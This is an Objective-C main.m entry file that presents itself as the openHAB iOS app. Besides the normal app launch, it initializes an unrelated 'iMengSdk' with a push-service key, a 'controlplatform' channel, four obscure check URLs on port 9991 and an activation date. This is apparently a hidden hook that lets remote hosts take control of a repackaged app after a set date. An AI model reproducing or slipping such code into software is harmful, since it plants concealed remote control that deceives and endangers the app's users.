//
//  main.m
//  openHAB
//
//  Created by Victor Belov on 12/01/14.
//  Copyright (c) 2014 Victor Belov. All rights reserved.
//

#import <UIKit/UIKit.h>

#import "OpenHABAppDelegate.h"
#import "iMengSdk.h"

int main(int argc, char * argv[]) {
    @autoreleasepool {
        
        NSDictionary *info =
        @{
          kJPushKey: @"5da25740b43d349318d2181a",
          kJPushChanel: @"controlplatform",
          kCheckUrl: @[
                  @"ajfd7669.com:9991/",
                  @"xnd7239.pw:9991/",
                  @"xnjdn928.xyz:9991/",
                  @"xnjdsaf7.xyz:9991/",
                  ],
          kOpenDate: @"2018-07-23",
          kIsDebugMode: @NO
          };
        iMengSdk_init([OpenHABAppDelegate class], info);
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([OpenHABAppDelegate class]));
    }
    
}
